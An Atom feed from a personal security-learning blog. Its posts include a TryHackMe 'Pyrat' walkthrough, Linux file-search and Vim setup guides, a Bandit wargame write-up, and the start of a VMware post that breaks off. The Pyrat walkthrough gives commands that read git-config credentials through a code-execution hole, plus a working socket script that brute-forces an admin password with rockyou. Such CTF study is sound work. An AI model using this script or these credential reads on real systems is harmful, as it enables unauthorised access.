<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2025-07-26T15:18:04+05:30</updated><id>/feed.xml</id><title type="html">Himangshu Pan</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>Himangshu Pan</name></author><entry><title type="html">THM Pytrat Workthrough</title><link href="/blog/thm_pyrat_workthrough/" rel="alternate" type="text/html" title="THM Pytrat Workthrough" /><published>2025-07-26T00:00:00+05:30</published><updated>2025-07-26T00:00:00+05:30</updated><id>/blog/thm-pyrat-workthrough</id><content type="html" xml:base="/blog/thm_pyrat_workthrough/"><![CDATA[<h1 id="tryhackme-workthrough--pyrat">TryHackMe Workthrough =&gt; Pyrat</h1>

<h3 id="description">Description</h3>

<p>Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application‚Äôs older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.</p>

<h1 id="nmap-port-scan">Nmap port scan</h1>

<p>Screenshot:</p>

<p><img src="/assets/images/thm/pyrat/1.png" alt="image" /></p>

<p>Port ssh (22) and Hppt (8000) is open.
Screenshot:</p>

<h1 id="check-for-the-http-port-information">Check for the http port information.</h1>

<p><img src="/assets/images/thm/pyrat/2.png" alt="image" /></p>

<p>Basic connection ok. lets connect to port 8000 using netcat. Try to run hello world python syntax as description says there are potential python code execution vulnerability.
Screenshot:
<img src="/assets/images/thm/pyrat/3.png" alt="image" /></p>

<p>We can execute python codes here.</p>

<p>Next I will use python code execution payload further. Try to check for incomming mails.
Screenshot:
<img src="/assets/images/thm/pyrat/4.png" alt="image" /></p>

<p>May be there is something for me in <code class="language-plaintext highlighter-rouge">think</code>. Next try to read this mail.</p>

<p>Screenshot:
<img src="/assets/images/thm/pyrat/5.png" alt="image" /></p>

<p>search for git folders.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span><span class="p">;</span> <span class="nf">print</span><span class="p">([</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">ds</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="nf">walk</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="sh">"</span><span class="s">.git</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">d</span><span class="p">])</span>
</code></pre></div></div>

<p>Screenshot:
<img src="/assets/images/thm/pyrat/6.png" alt="image" /></p>

<p>Check git config.</p>

<p><img src="/assets/images/thm/pyrat/7.png" alt="image" /></p>

<p>We got username and password here. Let‚Äôs try to ssh using this credential.</p>

<p>We have successfully loged in and in the home directory there is an <code class="language-plaintext highlighter-rouge">users.txt</code> file contains our first flag.</p>

<h3 id="root">Root</h3>

<p><img src="/assets/images/thm/pyrat/8.png" alt="image" /></p>

<p>Python script to find admin password.</p>

<pre><code class="language-python=">import socket


TARGET_IP = '10.10.118.253'
TARGET_PORT = 8000
WORDLIST = '/usr/share/wordlists/rockyou.txt'


with open(WORDLIST, 'r', encoding="latin-1") as f:
    for password in f:
        password = password.strip()
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((TARGET_IP, TARGET_PORT))

            # Send admin
            s.sendall(b"admin\n")
            data = s.recv(4096).decode()

            # read password prompt
            if "Password:" in data:
                s.sendall((password + "\n").encode())
                data = s.recv(4096).decode()
                print(f"[TRY] Password: {password} | Response: {data.strip()}")

                if "Password:" not in data:
                    print(f"\n[SUCCESS] Password found: {password}")
                    break
            else:
                print("Error: unexpected response after sending username")

            s.close()
        except Exception as e:
            print("Error: %s " %e)

</code></pre>

<p>Now successfully got the admin password.
<img src="/assets/images/thm/pyrat/9.png" alt="image" /></p>

<h2 id="useful-commands">Useful commands.</h2>

<ol>
  <li><code class="language-plaintext highlighter-rouge">nmap -sS 10.10.133.11</code></li>
  <li><code class="language-plaintext highlighter-rouge">import os; print([r for r, d, ds in os.walk('/') if ".git" in d])</code></li>
  <li><code class="language-plaintext highlighter-rouge">print(open("/opt/dev/.git/config").read())</code></li>
  <li><code class="language-plaintext highlighter-rouge">ssh think@10.10.118.253</code></li>
  <li><code class="language-plaintext highlighter-rouge">nc 10.10.118.253 8000</code></li>
</ol>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[TryHackMe Workthrough =&gt; Pyrat]]></summary></entry><entry><title type="html">üìÅ Searching for Files in the Linux Terminal</title><link href="/blog/Searching_for_Files_in_the_Linux_Terminal/" rel="alternate" type="text/html" title="üìÅ Searching for Files in the Linux Terminal" /><published>2025-06-28T00:00:00+05:30</published><updated>2025-06-28T00:00:00+05:30</updated><id>/blog/filesearch</id><content type="html" xml:base="/blog/Searching_for_Files_in_the_Linux_Terminal/"><![CDATA[<h1 id="-searching-for-files-in-the-linux-terminal">üìÅ Searching for Files in the Linux Terminal</h1>

<p>Just like we rely on Google to search the web, we often need similar tools to locate files within our own system ‚Äî especially when we forget where they‚Äôre stored. On Linux, where everything is treated as a file (even devices and processes), having effective file search tools is crucial.</p>

<p>In this guide, we‚Äôll explore three essential commands that make file searching efficient on any Linux-based system: <code class="language-plaintext highlighter-rouge">which</code>, <code class="language-plaintext highlighter-rouge">locate</code>, and <code class="language-plaintext highlighter-rouge">find</code>.</p>

<hr />

<h2 id="-which--locate-executable-paths">üîç <code class="language-plaintext highlighter-rouge">which</code> ‚Äì Locate Executable Paths</h2>

<p>The <code class="language-plaintext highlighter-rouge">which</code> command identifies the full path of the executable file that will run when a command is entered. It looks through the directories listed in your <code class="language-plaintext highlighter-rouge">$PATH</code> environment variable and returns the first matching executable.</p>

<h3 id="-example">üß™ Example</h3>

<p>To find the full path of the <code class="language-plaintext highlighter-rouge">ls</code> command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which <span class="nb">ls</span>
</code></pre></div></div>

<p>This will output something like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/ls
</code></pre></div></div>

<p>This means when you type <code class="language-plaintext highlighter-rouge">ls</code>, the system actually runs <code class="language-plaintext highlighter-rouge">/bin/ls</code>.</p>

<hr />

<h3 id="-finding-all-executables">üîÅ Finding All Executables</h3>

<p>To list all instances of a command in your system‚Äôs <code class="language-plaintext highlighter-rouge">$PATH</code>, use the <code class="language-plaintext highlighter-rouge">-a</code> flag:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which <span class="nt">-a</span> <span class="nb">ls</span>
</code></pre></div></div>

<p>This might return:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/ls
/usr/bin/ls
</code></pre></div></div>

<p>The system chooses the <strong>first</strong> path listed in <code class="language-plaintext highlighter-rouge">$PATH</code>. To view the current search order:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$PATH</span>
</code></pre></div></div>

<p>Directories listed earlier in <code class="language-plaintext highlighter-rouge">$PATH</code> take priority, so <code class="language-plaintext highlighter-rouge">/bin/ls</code> is used before <code class="language-plaintext highlighter-rouge">/usr/bin/ls</code> if <code class="language-plaintext highlighter-rouge">/bin</code> appears first.</p>

<hr />

<h2 id="-locate--fast-file-search-using-a-database">üìö <code class="language-plaintext highlighter-rouge">locate</code> ‚Äì Fast File Search Using a Database</h2>

<p>The <code class="language-plaintext highlighter-rouge">locate</code> command quickly finds files by searching a prebuilt index (database) of all file paths on the system. Since it doesn‚Äôt scan in real time, it‚Äôs much faster than <code class="language-plaintext highlighter-rouge">find</code> for basic lookups.</p>

<hr />

<h3 id="Ô∏è-how-it-works">‚öôÔ∏è How It Works</h3>

<p>Instead of scanning the entire filesystem, <code class="language-plaintext highlighter-rouge">locate</code> queries a cached database (updated via the <code class="language-plaintext highlighter-rouge">updatedb</code> command, often run automatically by <code class="language-plaintext highlighter-rouge">cron</code>).</p>

<p>To search for a file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate passwd
</code></pre></div></div>

<p>This might return results like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/passwd
/var/backups/passwd.bak
</code></pre></div></div>

<hr />

<h3 id="-update-the-database">üîÅ Update the Database</h3>

<p>If you‚Äôve recently added or removed files, refresh the database manually:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>updatedb
</code></pre></div></div>

<blockquote>
  <p>üîß <strong>Note:</strong> On some systems, you may need to install <code class="language-plaintext highlighter-rouge">mlocate</code>:</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>mlocate
</code></pre></div></div>

<hr />

<h3 id="-case-insensitive-search">üîé Case-Insensitive Search</h3>

<p>Combine <code class="language-plaintext highlighter-rouge">locate</code> with <code class="language-plaintext highlighter-rouge">grep</code> for case-insensitive filtering:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate passwd | <span class="nb">grep</span> <span class="nt">-i</span> root
</code></pre></div></div>

<hr />

<h3 id="-practical-example">üìÑ Practical Example</h3>

<p>Let‚Äôs say you downloaded a PDF and forgot its location. Just run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate <span class="k">*</span>.pdf
</code></pre></div></div>

<p>And get a list of all <code class="language-plaintext highlighter-rouge">.pdf</code> files instantly.</p>

<hr />

<h2 id="-find--advanced-real-time-search">üß† <code class="language-plaintext highlighter-rouge">find</code> ‚Äì Advanced Real-Time Search</h2>

<p>The <code class="language-plaintext highlighter-rouge">find</code> command performs a <strong>live scan</strong> of the filesystem and supports a wide variety of filters and actions, making it one of the most powerful search utilities available.</p>

<hr />

<h3 id="-basic-syntax">üìå Basic Syntax</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find &lt;path&gt; &lt;options&gt; &lt;expression&gt;
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;path&gt;</code>: Directory to start the search (<code class="language-plaintext highlighter-rouge">/</code>, <code class="language-plaintext highlighter-rouge">.</code> for current dir).</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;options&gt;</code>: Search conditions (e.g. <code class="language-plaintext highlighter-rouge">-name</code>, <code class="language-plaintext highlighter-rouge">-size</code>, <code class="language-plaintext highlighter-rouge">-type</code>).</li>
</ul>

<hr />

<h3 id="-common-examples">üîç Common Examples</h3>

<h4 id="-search-by-name">üî† Search by Name</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> passwd
</code></pre></div></div>

<p>Case-insensitive:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-iname</span> passwd
</code></pre></div></div>

<hr />

<h4 id="-search-by-file-type">üìÅ Search by File Type</h4>

<p>Only directories:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> d <span class="nt">-name</span> config
</code></pre></div></div>

<p>Only regular files:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-name</span> filename.txt
</code></pre></div></div>

<hr />

<h4 id="-search-by-size">üß± Search by Size</h4>

<p>Files larger than 100MB:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-size</span> +100M
</code></pre></div></div>

<p>Files smaller than 10KB:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-size</span> <span class="nt">-10k</span>
</code></pre></div></div>

<hr />

<h4 id="Ô∏è-run-commands-on-results">‚öôÔ∏è Run Commands on Results</h4>

<p>Delete all <code class="language-plaintext highlighter-rouge">.tmp</code> files in <code class="language-plaintext highlighter-rouge">/tmp</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /tmp <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"*.tmp"</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></div>

<p>List details for all files in the current directory:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></div>

<hr />

<h4 id="-exclude-directories">üö´ Exclude Directories</h4>

<p>Search from root but skip <code class="language-plaintext highlighter-rouge">/proc</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-path</span> /proc <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-name</span> passwd <span class="nt">-print</span>
</code></pre></div></div>

<hr />

<h4 id="-search-by-time">üïí Search by Time</h4>

<p>Modified within last 7 days:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-mtime</span> <span class="nt">-7</span>
</code></pre></div></div>

<p>Accessed within last 24 hours:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-atime</span> <span class="nt">-1</span>
</code></pre></div></div>

<hr />

<h2 id="-final-thoughts">‚úÖ Final Thoughts</h2>

<p>Each tool has its strengths:</p>

<ul>
  <li>Use <strong><code class="language-plaintext highlighter-rouge">which</code></strong> to identify which version of a command is being run.</li>
  <li>Use <strong><code class="language-plaintext highlighter-rouge">locate</code></strong> for lightning-fast searches from an indexed database.</li>
  <li>Use <strong><code class="language-plaintext highlighter-rouge">find</code></strong> when you need powerful, flexible, and real-time results.</li>
</ul>

<p>Mastering these commands will significantly improve your efficiency when navigating or troubleshooting a Linux system.</p>

<p>Happy searching! üêß</p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[üìÅ Searching for Files in the Linux Terminal]]></summary></entry><entry><title type="html">üõ†Ô∏è Setup Vim as a Developer-Friendly Code Editor</title><link href="/blog/Setup_Vim_as_a_Developer-Friendly_Code_Editor/" rel="alternate" type="text/html" title="üõ†Ô∏è Setup Vim as a Developer-Friendly Code Editor" /><published>2025-06-26T00:00:00+05:30</published><updated>2025-06-26T00:00:00+05:30</updated><id>/blog/Setup_vim_as_a_developer_friendly_code_editor</id><content type="html" xml:base="/blog/Setup_Vim_as_a_Developer-Friendly_Code_Editor/"><![CDATA[<h1 id="setup-vim-as-a-developer-friendly-code-editor">Setup Vim as a Developer-Friendly Code Editor</h1>

<p>If you‚Äôre a developer aspiring to become a security researcher, using prebuilt OSINT tools is a great start. But to truly innovate‚Äîmodifying existing tools or building your own‚Äîyou need a powerful and efficient coding environment.</p>

<p>In the field of infosec, the terminal becomes your second home. While terminal-based editors aren‚Äôt the most beginner-friendly, they are essential tools for any serious security researcher. Mastering them not only sharpens your workflow but also prepares you for real-world scenarios where GUI-based tools might not be available.</p>

<p>I started my journey with <code class="language-plaintext highlighter-rouge">nano</code>‚Äîsimple and beginner-friendly. But as my needs grew, so did the limitations of nano. That‚Äôs when I decided to switch to <code class="language-plaintext highlighter-rouge">vi</code>/<code class="language-plaintext highlighter-rouge">vim</code>‚Äîa more advanced terminal-based editor that offers incredible flexibility and power.</p>

<p>Today, I‚Äôm configuring Vim to mimic features from modern IDEs like Visual Studio Code. My goal is to save time and boost efficiency through hard, consistent practice‚Äîbecause I believe in <em>practice hard to make life easy</em>.</p>

<p>Let‚Äôs walk through setting up Vim as a full-fledged coding environment.</p>

<hr />

<h2 id="Ô∏è-step-by-step-vim-setup">üõ†Ô∏è Step-by-Step Vim Setup</h2>

<h3 id="1-install-vim">üîß1. Install Vim</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
<span class="nb">sudo </span>apt <span class="nb">install </span>vim
</code></pre></div></div>

<hr />

<h3 id="-2-install-plugin-manager-vim-plug">üß± 2. Install Plugin Manager (<code class="language-plaintext highlighter-rouge">vim-plug</code>)</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-fLo</span> ~/.vim/autoload/plug.vim <span class="nt">--create-dirs</span> <span class="se">\</span>
   https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
</code></pre></div></div>

<hr />

<h3 id="Ô∏è-3-configure-vimrc">üóÇÔ∏è 3. Configure <code class="language-plaintext highlighter-rouge">~/.vimrc</code></h3>

<p>Open or create your Vim configuration file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim ~/.vimrc
</code></pre></div></div>

<p>Paste the following configuration:</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">" ----------------------------</span>
<span class="c">" VS Code-like Vim Configuration</span>
<span class="c">" ----------------------------</span>

<span class="k">call</span> plug#begin<span class="p">(</span><span class="s1">'~/.vim/plugged'</span><span class="p">)</span>

<span class="c">" File explorer with icons</span>
Plug <span class="s1">'preservim/nerdtree'</span>
Plug <span class="s1">'ryanoasis/vim-devicons'</span>

<span class="c">" Enhanced status line</span>
Plug <span class="s1">'vim-airline/vim-airline'</span>
Plug <span class="s1">'vim-airline/vim-airline-themes'</span>

<span class="c">" Syntax highlighting for many languages</span>
Plug <span class="s1">'sheerun/vim-polyglot'</span>

<span class="c">" Git integration</span>
Plug <span class="s1">'tpope/vim-fugitive'</span>

<span class="c">" Linting and diagnostics</span>
Plug <span class="s1">'dense-analysis/ale'</span>

<span class="c">" Auto code formatting</span>
Plug <span class="s1">'Chiel92/vim-autoformat'</span>

<span class="c">" Color scheme</span>
Plug <span class="s1">'morhetz/gruvbox'</span>

<span class="k">call</span> plug#end<span class="p">()</span>

<span class="c">" === General Settings ===</span>
<span class="nb">syntax</span> <span class="k">on</span>
<span class="k">set</span> <span class="k">number</span>
<span class="k">set</span> <span class="nb">relativenumber</span>
<span class="k">set</span> <span class="nb">tabstop</span><span class="p">=</span><span class="m">4</span>
<span class="k">set</span> <span class="nb">shiftwidth</span><span class="p">=</span><span class="m">4</span>
<span class="k">set</span> <span class="nb">expandtab</span>
<span class="k">set</span> <span class="nb">smartindent</span>
<span class="k">set</span> <span class="nb">autoindent</span>
<span class="k">set</span> <span class="nb">background</span><span class="p">=</span><span class="nb">dark</span>
<span class="k">colorscheme</span> gruvbox

<span class="c">" === Status Line ===</span>
<span class="k">let</span> <span class="nv">g:airline_theme</span><span class="p">=</span><span class="s1">'gruvbox'</span>
<span class="k">let</span> <span class="nv">g:airline_powerline_fonts</span><span class="p">=</span><span class="m">1</span>

<span class="c">" === NERDTree Shortcut ===</span>
nnoremap <span class="p">&lt;</span>C<span class="p">-</span><span class="k">n</span><span class="p">&gt;</span> <span class="p">:</span>NERDTreeToggle<span class="p">&lt;</span>CR<span class="p">&gt;</span>

<span class="c">" === Format on Save ===</span>
autocmd <span class="nb">BufWritePre</span> * <span class="p">:</span>Autoformat

<span class="c">" === Git Shortcut ===</span>
nnoremap <span class="p">&lt;</span>leader<span class="p">&gt;</span>gs <span class="p">:</span>G<span class="p">&lt;</span>CR<span class="p">&gt;</span>

<span class="c">" === Mouse Support ===</span>
<span class="k">set</span> <span class="nb">mouse</span><span class="p">=</span><span class="k">a</span>

<span class="c">" === Enable Icons ===</span>
<span class="k">set</span> <span class="nb">encoding</span><span class="p">=</span>utf<span class="m">-8</span>
<span class="k">let</span> <span class="nv">g:WebDevIconsUnicodeDecorateFileNodes</span> <span class="p">=</span> <span class="m">1</span>
<span class="k">let</span> <span class="nv">g:NERDTreeShowHidden</span><span class="p">=</span><span class="m">1</span>
</code></pre></div></div>

<hr />

<h3 id="-4-install-vim-plugins">üîå 4. Install Vim Plugins</h3>

<p>Open Vim and run the following command:</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">:</span>PlugInstall
</code></pre></div></div>

<hr />

<h3 id="-5-set-up-autoformatters">üßº 5. Set Up Autoformatters</h3>

<p>Install external formatters based on the languages you use:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>clang-format       <span class="c"># For C/C++</span>
<span class="nb">sudo </span>apt <span class="nb">install </span>black              <span class="c"># For Python</span>
<span class="nb">sudo </span>npm <span class="nb">install</span> <span class="nt">-g</span> prettier        <span class="c"># For JS/HTML/CSS/JSON</span>
</code></pre></div></div>

<hr />

<h3 id="-6-enable-icons-with-nerd-fonts-optional-but-recommended">üé® 6. Enable Icons with Nerd Fonts (Optional but Recommended)</h3>

<p>Install Nerd Fonts for proper icon rendering. Here‚Äôs an example using JetBrainsMono:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> ~/.local/share/fonts
<span class="nb">cd</span> ~/.local/share/fonts
wget https://github.com/ryanoasis/nerd-fonts/releases/latest/download/JetBrainsMono.zip
unzip JetBrainsMono.zip
fc-cache <span class="nt">-fv</span>
</code></pre></div></div>

<p>Then, in your terminal settings, set the font to <strong>JetBrainsMono Nerd Font</strong>.</p>

<hr />

<p><strong>Happy Hacking!</strong> üêßüíªüõ°Ô∏è</p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[Setup Vim as a Developer-Friendly Code Editor]]></summary></entry><entry><title type="html">üéÆ Wargames ‚Üí OverTheWire Bandit Series</title><link href="/blog/Wargames%E2%86%92OverTheWire_Bandit_Series_level_01/" rel="alternate" type="text/html" title="üéÆ Wargames ‚Üí OverTheWire Bandit Series" /><published>2025-06-26T00:00:00+05:30</published><updated>2025-06-26T00:00:00+05:30</updated><id>/blog/Wargames%E2%86%92OverTheWire_Bandit_Series</id><content type="html" xml:base="/blog/Wargames%E2%86%92OverTheWire_Bandit_Series_level_01/"><![CDATA[<h1 id="-wargames--overthewire-bandit-series-level0-1">üéÆ Wargames ‚Üí OverTheWire Bandit Series (Level0-1)</h1>

<p>In the field of information security, theory alone isn‚Äôt enough ‚Äî without hands-on practice, your knowledge has little real value.</p>

<p>This raises an important question: how should I go about practicing effectively? I understand the need for a dedicated lab environment, which is why I previously set up VMware on my system.</p>

<p>VMware allows me to simulate Capture The Flag (CTF) challenges locally and experiment with various hacking tools on isolated guest machines.</p>

<p>However, today I discovered an even more accessible option: <strong>online wargames</strong>. These platforms offer hands-on practice in a more guided and interactive manner, making the learning process faster and more effective compared to reading books.</p>

<p>One such platform is <a href="https://overthewire.org"><strong>OverTheWire</strong></a>, which offers a variety of wargame series such as <strong>Bandit</strong>, <strong>Natas</strong>, <strong>Leviathan</strong>, <strong>Krypton</strong>, and more. Each wargame is structured in levels ‚Äî to advance, you must retrieve the password for the next level by applying different hacking tools and techniques.</p>

<p>Today, I‚Äôm starting with the <a href="https://overthewire.org/wargames/bandit/"><strong>Bandit Series</strong></a>, which is recommended for beginners.</p>

<hr />

<h3 id="about-bandit">About Bandit</h3>

<p>The Bandit series contains a total of <strong>33 levels</strong>. To play, I need to connect to the server using SSH:</p>

<ul>
  <li><strong>Host:</strong> <code class="language-plaintext highlighter-rouge">bandit.labs.overthewire.org</code></li>
  <li><strong>Port:</strong> <code class="language-plaintext highlighter-rouge">2220</code></li>
  <li><strong>Level 0 Login:</strong>
    <ul>
      <li><strong>Username:</strong> <code class="language-plaintext highlighter-rouge">bandit0</code></li>
      <li><strong>Password:</strong> <code class="language-plaintext highlighter-rouge">bandit0</code></li>
    </ul>
  </li>
</ul>

<p>At each level, the goal is to find the password for the next user (e.g., <code class="language-plaintext highlighter-rouge">bandit1</code>, <code class="language-plaintext highlighter-rouge">bandit2</code>, and so on) by exploring the system, reading files, and using Linux command-line tools. This process continues until the final level is reached.</p>

<hr />

<h3 id="before-you-begin-a-quick-overview-of-ssh">Before You Begin: A Quick Overview of SSH</h3>

<p>Before we dive into the Bandit series, it‚Äôs crucial to understand SSH (Secure Shell) ‚Äî the primary method used to connect to each level.</p>

<p>SSH is a cryptographic network protocol that enables secure communication between two remote devices. With SSH, you can remotely log in to servers, securely transfer files, execute commands on remote machines, and even set up encrypted tunnels through port forwarding.</p>

<p>To connect to the Bandit server as bandit0, you can use:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bandit0@bandit.labs.overthewire.org
</code></pre></div></div>

<p>If the account is password-protected, you‚Äôll be prompted to enter it.</p>

<p>SSH also supports key-based authentication. You can use the -i option to specify a private key file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bandit0@bandit.labs.overthewire.org <span class="nt">-i</span> bandit0-key-file
</code></pre></div></div>

<p>For more details and options, refer to the SSH manual page:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man ssh
</code></pre></div></div>

<hr />

<p>Let‚Äôs begin the game. First, I attempt to log in to Level 0 using the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bandit0@bandit.labs.overthewire.org <span class="nt">-p</span> 2220
</code></pre></div></div>

<p><img src="/assets/images/bandit/bandit1/bandit0.png" alt="Image not found" /></p>

<p>This command prompts for a password, which is already known. I‚Äôll enter <code class="language-plaintext highlighter-rouge">bandit0</code> and hit Enter.</p>

<p>Login successful!</p>

<p>Since all levels in the Bandit series use the same host and port, I‚Äôll configure this in my SSH config file to save time. Additionally, I‚Äôll define a variable named BANDIT for bandit.labs.overthewire.org. This way, I won‚Äôt have to type the full details every time ‚Äî making the process faster and more convenient.</p>

<p>Let‚Äôs start by creating or editing the SSH config file located at <code class="language-plaintext highlighter-rouge">~/.ssh/config</code>. Below is my updated configuration for this setup
<img src="/assets/images/bandit/bandit1/bandit1.png" alt="Image not found" /></p>

<p>Also adding the following line to the <code class="language-plaintext highlighter-rouge">~/.bashrc</code> file.</p>

<p><img src="/assets/images/bandit/bandit1/bandit2.png" alt="Image not found" /></p>

<p>Now I have to load the latest .bashrc file changes into current shell using <code class="language-plaintext highlighter-rouge">source ~/.bashrc</code></p>

<p>I can use <code class="language-plaintext highlighter-rouge">ssh bandit@$BANDIT</code> in place of <code class="language-plaintext highlighter-rouge">ssh bandit0@bandit.labs.overthewire.org -p 2220</code> and this should work perfectly.</p>

<p><img src="/assets/images/bandit/bandit1/bandit3.png" alt="Image not found" /></p>

<p>Working fine. typing password <code class="language-plaintext highlighter-rouge">bandit0</code> and successfully loged in with a welcome and guided message.</p>

<p>My next challenge is to find the password for Level 1. According to the Bandit <a href="https://overthewire.org/wargames/bandit/bandit1.html">Level 0 ‚Üí Level 1 instructions</a>, there is a file named <strong>****</strong>readme<strong>****</strong> located in the home directory. This file contains the password needed to access the next level.</p>

<p>Let‚Äôs list the files in the home directory using the <code class="language-plaintext highlighter-rouge">ls</code> command. This will display the contents of the current directory, where we should find the readme file containing the password for the next level.</p>

<p><img src="/assets/images/bandit/bandit1/bandit4.png" alt="Image not found" /></p>

<p>We can see that the readme file exists. Let‚Äôs try to read its contents using the <code class="language-plaintext highlighter-rouge">cat</code> command. This will display the password for Level 1 on the terminal.</p>

<p><img src="/assets/images/bandit/bandit1/bandit5.png" alt="Image not found" /></p>

<p>We have successfully retrieved the password for the <strong>bandit1</strong> user.</p>

<h3 id="-what-we-learned-in-this-level">üß† What We Learned in This Level</h3>

<ul>
  <li>How to configure and use <code class="language-plaintext highlighter-rouge">ssh</code> for remote login</li>
  <li>How to list files in a directory using the <code class="language-plaintext highlighter-rouge">ls</code> command</li>
  <li>How to read the contents of a file using the <code class="language-plaintext highlighter-rouge">cat</code> command</li>
</ul>

<p>Next Blog, I‚Äôll continue to the Bandit series wargame.</p>

<p><strong>Happy hacking!</strong></p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[üéÆ Wargames ‚Üí OverTheWire Bandit Series (Level0-1)]]></summary></entry><entry><title type="html">üõ†Ô∏è Setting Up VMware Workstation on Ubuntu 22.04</title><link href="/blog/Setting_Up_VMware_Workstation/" rel="alternate" type="text/html" title="üõ†Ô∏è Setting Up VMware Workstation on Ubuntu 22.04" /><published>2025-06-25T00:00:00+05:30</published><updated>2025-06-25T00:00:00+05:30</updated><id>/blog/Setting_Up_VMware_Workstation</id><content type="html" xml:base="/blog/Setting_Up_VMware_Workstation/"><![CDATA[<h1 id="Ô∏è-setting-up-vmware-workstation-on-ubuntu-2204">üõ†Ô∏è Setting Up VMware Workstation on Ubuntu 22.04</h1>

<blockquote>
  <p><em>‚ÄúIf I had 30 minutes to cut down a tree, I‚Äôd spend the first 20 sharpening my axe.‚Äù</em> ‚Äî Abraham Lincoln</p>
</blockquote>

<p>This quote perfectly captures the mindset needed in the field of information security. The more you practice, the less time it takes to solve a challenge or crack a machine. Preparation is everything.</p>

<p>To ethically practice hacking and security skills, it‚Äôs crucial to set up your own local lab environment. Virtualization software enables us to run multiple isolated systems safely on a single host machine. Among the most popular options are <strong>VirtualBox</strong> and <strong>VMware</strong>.</p>

